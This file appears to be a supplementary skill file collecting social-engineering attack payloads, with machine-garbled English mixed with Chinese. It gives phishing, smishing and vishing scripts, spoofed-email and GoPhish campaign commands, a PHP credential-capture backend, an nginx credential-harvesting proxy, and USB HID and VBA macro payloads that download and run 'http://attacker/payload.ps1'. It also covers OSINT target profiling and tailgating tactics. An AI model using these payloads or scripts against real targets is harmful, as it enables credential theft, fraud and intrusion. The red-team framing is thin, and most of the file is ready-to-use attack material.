# Social Engineering Payloads / social engineeringpayload

> thisfileis `SKILL.md` Supplementary Files，containsall SE attackpayload，byclassotherorganization。

---

## 1. Phishing (phishing attack)

### 1.1 SET (Social-Engineer Toolkit) Campaign

```bash
# start SET（need root permission）
sudo setoolkit

# main菜singleselectpath：
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 1) Perform a Mass Email Attack
# 2) Create a FileFormat Payload
# 3) Create a Social Engineering Template
# 2) Website Attack Vectors
# 1) Java Applet Attack Method
# 2) Metasploit Browser Exploit Method
# 3) Credential Harvester Attack Method
# 4) Tabnabbing Attack Method
# 5) Web Jacking Attack Method
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack Vector
# 8) QRCode Generator Attack Vector
# 9) Powershell Attack Vectors

# SET credential harvestingtoolconfiguration
# select Website Attack Vectors -> Credential Harvester Attack Method
# input要clone URL（such as https://target-company.com/login）
# inputthismachine IP: <attacker-ip>
# SET automated createclonepage，POST formpoint toattackerserver
```

### 1.2 SET mailpiecetemplate Payload

```
Subject: {紧急通知} IT 部门密码策略更新 - 需立即操作

尊敬的 {target_name}，

根据公司安全政策第 4.2 条，您的域账户密码将于 {date} 过期。
为避免账户锁定，请立即通过以下安全链接更新密码：

https://secure-auth.{spoofed-domain}/password-reset?token={random}

IT Security Team
{target-company} Information Technology
内线: {fake_ext}
```

### 1.3 GoPhish Campaign automated

```bash
# GoPhish start
./gophish

# through REST API automated create Campaign
# Step 1: create Sending Profile (SMTP configuration)
curl -X POST https://gophish-server:3333/api/smtp/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Corporate-SMTP",
    "host": "smtp.evil-server.com:587",
    "from_address": "it-support@spoofed-domain.com",
    "username": "user",
    "password": "pass",
    "headers": [
      {"key": "X-Mailer", "value": "Corporate-Mail-System"}
    ]
  }'

# Step 2: create Landing Page (credential harvestingpage)
curl -X POST https://gophish-server:3333/api/pages/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSO-Login-Clone",
    "html": "<html>...</html>",
    "capture_credentials": true,
    "capture_passwords": true,
    "redirect_url": "https://real-sso.target-company.com"
  }'

# Step 3: createmailpiecetemplate
curl -X POST https://gophish-server:3333/api/templates/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Password-Expiry-Notice",
    "subject": "Action Required: Password Expiration Notice",
    "html": "<p>Dear {{.FirstName}},</p><p>Your password expires...</p>",
    "add_tracking_image": true
  }'

# Step 4: importtargetusergroup
curl -X POST https://gophish-server:3333/api/groups/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Finance-Department",
    "targets": [
      {"email": "user1@target.com", "first_name": "John", "last_name": "Doe"},
      {"email": "user2@target.com", "first_name": "Jane", "last_name": "Smith"}
    ]
  }'

# Step 5: start Campaign
curl -X POST https://gophish-server:3333/api/campaigns/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q2-Security-Awareness-Test",
    "template": {"name": "Password-Expiry-Notice"},
    "page": {"name": "SSO-Login-Clone"},
    "smtp": {"name": "Corporate-SMTP"},
    "groups": [{"name": "Finance-Department"}],
    "launch_date": "2026-05-01T09:00:00Z"
  }'

# Step 6: obtain Campaign result
curl -X GET https://gophish-server:3333/api/campaigns/{campaign_id}/results \
  -H "Authorization: {api_key}"
```

### 1.4 King-Phisher Campaign

```bash
# King-Phisher serviceendstart
king-phisher-server -f server_config.yml

# King-Phisher clientconnect
king-phisher-client

# through YAML configuration Campaign
# server_config.yml criticalconfiguration：
# server:
# host: 0.0.0.0
# port: 80
# database: sqlite:///king_phisher.db
# server_secret: <secret>
# uid: king-phisher
# web_root: /opt/king-phisher/data/server/www

# Campaign parameter：
# - mailpiecetemplate (HTML + Plain Text)
# - targetlist (CSV import)
# - sendinterval隔 (avoidtriggerspeedratelimitation)
# - point击traceandcredentialsrecord
# - 防awarenesstrainingmode (education URL)
```

---

## 2. Email Spoofing (mailpieceforgery)

### 2.1 SPF/DKIM/DMARC reconnaissance

```bash
# checktargetdomain SPF record
dig txt target-company.com | grep -i spf
# outputexample: "v=spf1 include:_spf.google.com ~all"
# ~all = softfail (can bybypass) vs -all = hardfail (较difficultbypass)

# check DKIM record
dig txt default._domainkey.target-company.com
# outputexample: "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3..."

# check DMARC policy
dig txt _dmarc.target-company.com
# outputexample: "v=DMARC1; p=none; rua=mailto:dmarc@target-company.com"
# p=none (noforce) / p=quarantine (isolation) / p=reject (deny)

# use smtp-user-enum verifyemail addressaddressexistsity
smtp-user-enum -M VRFY -U users.txt -t mail.target-company.com

# use swaks perform SMTP sessiontesting
swaks --to victim@target-company.com \
 --from spoofed@evil.com \
 --server mail.target-company.com \
 --header "Subject: Test" \
 --body "Test email"
```

### 2.2 mailpieceforgerysend

```bash
# use sendemail sendforgerymailpiece
sendemail -f "IT-Support@target-company.com" \
  -t victim@target-company.com \
  -u "紧急：密码过期通知" \
  -m "您的邮箱密码将在24小时后过期，请立即更新：http://evil-server/reset" \
  -s smtp.evil-server.com:587 \
  -xu username -xp password \
  -o tls=yes

# use swaks sendband附piece forgerymailpiece
swaks --to victim@target-company.com \
 --from "ceo@target-company.com" \
 --header "Subject: Q4 Financial Review - Confidential" \
 --body "Please review the attached document urgently." \
 --attach @malicious_document.xlsx \
 --server smtp.evil-server.com:587 \
 --auth LOGIN \
 --auth-user "username" \
 --auth-password "password" \
 --tls

# use Python smtp-lib batchamountsend
python3 -c "
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

smtp = smtplib.SMTP('smtp.evil-server.com', 587)
smtp.starttls()
smtp.login('user', 'pass')

msg = MIMEMultipart('alternative')
msg['From'] = 'HR-Benefits@target-company.com'
msg['Subject'] = 'Annual Benefits Enrollment - Action Required'

with open('targets.txt') as f:
    targets = [line.strip() for line in f if line.strip()]

html = open('email_template.html').read()
for target in targets:
    msg['To'] = target
    msg.set_payload(html)
    smtp.send_message(msg)
    print(f'Sent to {target}')

smtp.quit()
"
```

### 2.3 SPF/DKIM/DMARC bypasstechnique

```bash
# technique 1: exploit SPF softfail (~all) - usenot authorization IP send
# targetdomainuse ~all andnon -all when ，largemultiplenumbermailpiecegateway仍willdeliver

# technique 2: similardomain namespoofing (Lookalike Domain)
# register rnicrosoft.com (r+n alternative m) or target-company.com (零宽characters)
# SPF checkthroughbecauseas确realisthedomain combinemethodsendpieceperson

# technique 3: exploitNo.third-partymailpieceservice
# usecan by SPF include mailpieceservice (such as Google Workspace, Office 365)
# such as resulttargetdomain include:_spf.google.com，can through Google send

# technique 4: DMARC none policyexploit
# p=none when DMARC notexecuteany policy，onlysendreport
# can inreporttoreachbeforecompleteattackwindow

# technique 5: mailpieceheadinjection
# throughmodify Reply-To、Return-Path etc.headdepartmentFieldbypasspartialcheck
swaks --to victim@target.com \
 --from legitimate-sender@target.com \
 --header "Reply-To: attacker@evil.com" \
 --header "Return-Path: attacker@evil.com" \
 --header "X-Priority: 1" \
 --body "Urgent: please reply to this email immediately"
```

---

## 3. Credential Harvesting Pages (credential harvestingpage)

### 3.1 websitecloneandcredentialscapture

```bash
# SET credential harvestingmode
sudo setoolkit
# -> Website Attack Vectors (2)
# -> Credential Harvester Attack Method (3)
# -> Site Cloner (2)
# input要clone URL: https://accounts.google.com
# inputthismachine IP: <attacker-ip>
# SET automated createclonepage，POST formpoint toattackerserver

# manual clone + credentialscapture (httrack)
httrack https://target-company.com/login -O /var/www/clone/

# modifyclonepage form action
# raw: <form action="/api/authenticate" method="POST">
# modify: <form action="http://attacker-server/capture.php" method="POST">
```

### 3.2 credentialscapturebackend

```php
<?php
// capture.php - 凭据捕获脚本
$log_file = '/var/log/harvest/credentials.log';
$redirect_url = 'https://real-target-company.com/login';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    $credentials = [];
    foreach ($_POST as $key => $value) {
        $credentials[$key] = $value;
    }

    $log_entry = sprintf(
        "[%s] IP: %s | UA: %s | Data: %s\n",
        $timestamp,
        $ip,
        $user_agent,
        json_encode($credentials)
    );

    file_put_contents($log_file, $log_entry, FILE_APPEND);
    header("Location: " . $redirect_url);
    exit();
}

header("Location: " . $redirect_url);
exit();
?>
```

### 3.3 GoPhish Landing Page HTML

```html
<!-- GoPhish 凭据收割页面模板 -->
<!DOCTYPE html>
<html>
<head>
  <title>Sign In</title>
  <!-- 复制原始页面的 CSS/JS 资源 -->
</head>
<body>
  <form action="" method="POST">
    <!-- GoPhish 自动注入捕获逻辑 -->
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
  <!-- {{.Tracker}} - GoPhish 追踪像素 -->
</body>
</html>
```

### 3.4 Nginx reverseproxycredential harvesting

```nginx
# nginx.conf - reverseproxymodecredential harvesting
# flowamountthroughoverattackerserver，recordcredentialsafterforwardtorealserver
server {
    listen 443 ssl;
    server_name secure-auth.spoofed-domain.com;

    ssl_certificate /etc/ssl/certs/spoofed.pem;
    ssl_certificate_key /etc/ssl/private/spoofed.key;

    location / {
 # record POST requestbodyin credentials
        access_log /var/log/nginx/harvest.log combined;

        lua_need_request_body on;
        access_by_lua_block {
            if ngx.req.get_method() == "POST" then
                ngx.req.read_body()
                local body = ngx.req.get_body_data()
                if body then
                    local f = io.open("/var/log/harvest/creds.log", "a")
                    f:write(os.date() .. " | " .. body .. "\n")
                    f:close()
                end
            end
        }

        proxy_pass https://real-target-company.com;
        proxy_set_header Host real-target-company.com;
        proxy_ssl_server_name on;
    }
}
```

---

## 4. SMS Phishing / Smishing (短informationphishing)

### 4.1 Smishing Payload template

```
# 银row/金融class
[Bank Name]: We detected unusual activity on your account.
Verify now: https://{spoofed-domain}/secure-verify or call {fake-phone}

# fast递/物flowclass
[Courier]: Your package could not be delivered.
Schedule redelivery: https://{spoofed-domain}/redelivery?ref={tracking}

# IT/security class
[IT Security]: Unauthorized access detected on your account.
Secure your account: https://{spoofed-domain}/security-check

# HR/row政class
[HR Department]: Your annual benefits enrollment closes today.
Complete now: https://{spoofed-domain}/benefits-enrollment

# 政府machineconstructclass
[Tax Authority]: Your tax refund is pending verification.
Verify identity: https://{spoofed-domain}/tax-refund-verify
```

### 4.2 Smishing Toolcommand

```bash
# use SMS gatewayservicesendphishing短information
# through Twilio API (needcombinemethodauthorization testingaccount)
curl -X POST https://api.twilio.com/2010-04-01/Accounts/{sid}/Messages.json \
 --data-urlencode "Body=[IT Security] Unauthorized access detected. Verify: https://spoofed/verify" \
 --data-urlencode "From=+15551234567" \
 --data-urlencode "To=+15559876543" \
  -u {sid}:{auth_token}

# use GoPhish SMS plugin (such as resultcan use)
# orthrough SMTP-to-SMS gatewaysend
sendemail -f "noreply@spoofed.com" \
  -t victim-phone-number@sms-gateway.carrier.com \
  -u "Security Alert" \
  -m "Unauthorized access. Verify: https://spoofed/verify" \
  -s smtp.evil-server.com:587

# common 运营商 SMS gatewayaddress:
# AT&T: number@txt.att.net
# Verizon: number@vtext.com
# T-Mobile: number@tmomail.net
```

---

## 5. Vishing Techniques (voicephishing)

### 5.1 Vishing scripttemplate

```
# IT Help Desk 冒chargescript
Agent: "Hi, this is {fake_name} from IT Support. We've detected
        unauthorized access attempts on your account from an IP in
        {foreign_country}. For security, I need to verify your identity.
        Could you confirm your username and password?"

Target: [提供凭据]

Agent: "Thank you. I've now secured your account. You should receive
        a confirmation email shortly. Is there anything else I can
        help with?"

# HR/row政冒chargescript
Agent: "Hello, this is {fake_name} from Human Resources. I'm calling
        about your annual benefits enrollment. There seems to be an
        issue with your portal access. Can you try logging in at
        {spoofed_url} while I stay on the line?"

# techniquesupports冒chargescript (Microsoft/Google)
Agent: "Hello, this is Microsoft Security Center. We've detected
        malware on your computer that is sending spam. I can walk
        you through removing it. First, please open your browser
        and go to {remote_access_url} so I can connect and assist."
```

### 5.2 Vishing Tool

```bash
# VoIP callTool
# use SIP clientinitiate VoIP call
# caller ID spoofing
sipcli -d target-number -s spoofed-caller-id -u sip-user -p sip-password -h sip-server

# use Asterisk/FreePBX build VoIP basic facility
# asterisk basic configuration:
# /etc/asterisk/sip.conf - configuration SIP account
# /etc/asterisk/extensions.conf - configuration拨numberplan

# automated voicephishing (Vishing Bot)
# use Twilio Voice API
curl -X POST https://api.twilio.com/2010-04-01/Accounts/{sid}/Calls.json \
 --data-urlencode "Url=https://evil-server/vishing-script.xml" \
 --data-urlencode "To=+15559876543" \
 --data-urlencode "From=+15551234567" \
  -u {sid}:{auth_token}

# TwiML voicescript (vishing-script.xml)
# <?xml version="1.0" encoding="UTF-8"?>
# <Response>
# <Say voice="alice">
# This is an automated security notification from IT department.
# We have detected unauthorized access to your account.
# Please enter your employee ID followed by the pound sign.
# </Say>
# <Gather numDigits="6" action="/capture-input" method="POST"/>
# </Response>
```

---

## 6. Baiting / Drop USB Payloads (decoy投放)

### 6.1 USB decoyfiletype

```bash
# pseudoinstalldocumentationfilename
"Q4_Salary_Adjustments_CONFIDENTIAL.exe"          # 可执行文件伪装
"Employee_Benefits_2026.pdf.lnk"                  # 快捷方式伪装
"Company_Policy_Update.docm"                       # 启用宏的文档
"Network_Diagram_v2.xlsm"                         # 启用宏的表格
"Interview_Candidates_PhilHR.exe"                  # 社工热点文件名
"Password_Reset_Instructions.hta"                  # HTML 应用程序

# Rubber Ducky / Hak5 USB Payload
# Duckyscript example (mode拟键盘input)
DELAY 3000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER

# HID attack (Human Interface Device)
# Bash Bunny payload
# #!/bin/bash
# ATTACKMODE HID STORAGE
# LED R FAST
# Q RUNCOMBO ENTER
# Q DELAY 1000
# Q STRING powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
# Q ENTER
```

### 6.2 USB deliverpolicy

```
物理投递策略：
1. 标签策略 - 贴上 "Salary Data" / "Confidential" / "HR Records" 标签
2. 位置选择 - 停车场、前台、电梯口、洗手间、会议室
3. 外观伪装 - 使用品牌 U 盘外壳、定制印 LOGO
4. 配套材料 - 附带便签 "请查阅 Q4 财务数据" 或 "在会议室发现的"
5. 批量投放 - 投放 5-10 个到不同区域提高命中率

CD/DVD 诱饵：
- 标签: "员工培训视频" / "软件安装盘"
- 内容: 自动运行脚本 + 伪装界面
```

### 6.3 maliciousdocumentation宏 Payload

```vba
' VBA 宏代码 (嵌入 .docm 文件)
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"""
    Shell cmd, vbHide
End Sub

' 侧加载 DLL 技术示例
' 修改 .docx 中的 document.xml.rels 指向恶意模板
' 使用 remoteTemplate 注入
```

---

## 7. Social Media Reconnaissance for Targeting (social mediareconnaissance)

### 7.1 OSINT automated collect

```bash
# Step 1: domain name -> email addresscollect
theHarvester -d target-company.com -b all -l 500
theHarvester -d target-company.com -b google,bing,linkedin -l 200

# Step 2: social mediacrossverify
# LinkedIn: 职bit、department门、tech stack、input职when interval、same事closesystem
# Twitter/X: technique兴趣、近periodactivity、use Tool、地reasonbitconfiguration
# GitHub: open-sourceproject、technique偏好、codeinleakage information、commit when intervalmode
# Facebook/Instagram: personal兴趣、家庭information、bitconfiguration签to、socialexchange圈

# Step 3: Maltego can viewizerelatedanalysis
# machinetooltransformchain:
# Domain -> DNS Names -> IP Address -> AS Number
# Domain -> Email -> Person -> Social Profile -> Phone Number
# Person -> Company -> Colleagues -> Email Addresses
# Phone Number -> Location -> Associated Persons

# Maltego commandrow (maltego canthrough GUI or CE versionrun)
# recommendtransform:
# - To Email Address [from Domain]
# - To Person [from Email]
# - To Social Network Profile [from Person]
# - To Phone Number [from Person]
# - To Location [from Phone Number]

# Step 4: recon-ng automated 聚combine
recon-ng
> marketplace install all
> modules load recon/domains-contacts/email-harvester
> options set source target-company.com
> run
> modules load recon/contacts-profiles/fullcontact
> options set source emails.txt
> run
> back

# recon-ng exportresult
> modules load reporting/csv
> options set filename /tmp/recon-results.csv
> run

# Step 5: Sherlock social mediausernametrace
sherlock target_username --print-found --output results.txt

# Step 6: SpiderFoot automated OSINT
spiderfoot -l 127.0.0.1:5001
# Web UI: http://127.0.0.1:5001
# input: targetemail address、username、phone number、domain name
# automated related: social media、dataleakage、DNS record、暗networkinformation
```

### 7.2 target画像informationchecklist

```
收集维度：
1. 基本信息: 姓名、职位、部门、入职时间、汇报关系
2. 联系方式: 工作邮箱、个人邮箱、电话号码、Skype/Teams
3. 技术画像: 使用的操作系统、编程语言、开发工具、云服务
4. 行为模式: 工作时间、出差频率、会议习惯、沟通偏好
5. 社交关系: 同事关系、上级下级、外部合作伙伴
6. 个人兴趣: 爱好、社团、社交圈、近期活动
7. 安全意识: 是否参与过安全培训、密码策略遵守情况
8. 组织架构: 部门结构、决策链、关键人员
```

---

## 8. Physical Social Engineering (物reasonsocialwork)

### 8.1 Tailgating (tailgating) technique

```
尾随进入策略：
1. 手持重物策略 - 双手抱满快递/文件箱，等待他人刷卡开门
   "Could you get that for me? My hands are full."
2. 忘带门禁策略 - 假装翻找门禁卡
   "Oh, I left my badge at my desk. I just stepped out for coffee."
3. 社交工程策略 - 主动与目标搭话
   "Hi, are you heading to the 3rd floor too? I'm new here."
4. 紧急情况策略 - 伪装维修人员/快递员
   "I have an urgent delivery for the server room."
5. VIP 策略 - 伪装高管/访客
   "I'm here for the board meeting. Can you show me to the conference room?"

物理访问测试清单:
- [ ] 大门/旋转门是否有尾随检测
- [ ] 访客登记是否严格验证身份证件
- [ ] 内部区域是否需要二次刷卡
- [ ] 服务器机房是否有生物识别
- [ ] 安全摄像头是否覆盖所有入口
- [ ] 是否有安全巡逻和抽查
```

### 8.2 物reasonpseudoinstall道tool

```
伪装角色与道具清单：

IT 维修人员:
- 蓝色工装连体衣 + 工具包 + 工牌挂绳
- 贴有 IT 部门标签的笔记本电脑
- 网线测试仪、螺丝刀套装

快递员:
- 快递公司制服 + 快递袋 + 手持终端
- 预先准备的伪造包裹

访客:
- 商务正装 + 会议文件夹 + 名牌
- 打印的会议日程表

清洁人员:
- 清洁公司制服 + 清洁推车
- 进入非工作区域的自然理由

维修承包商:
- 安全帽 + 反光背心 + 工具箱
- 施工许可文件 (伪造)
```

### 8.3 物reasonsocialworknote事item

```
执行原则:
1. 始终保持自信和自然的态度
2. 预先准备合理的借口和理由
3. 了解目标的日常运作流程
4. 准备应急退出方案
5. 记录所有交互细节用于报告
6. 遵守授权范围和规则约束
7. 携带身份验证文件 (红队授权书)
8. 避免引起恐慌或破坏
9. 注意摄像头和安保人员
10. 在计划时间窗口内完成操作
```
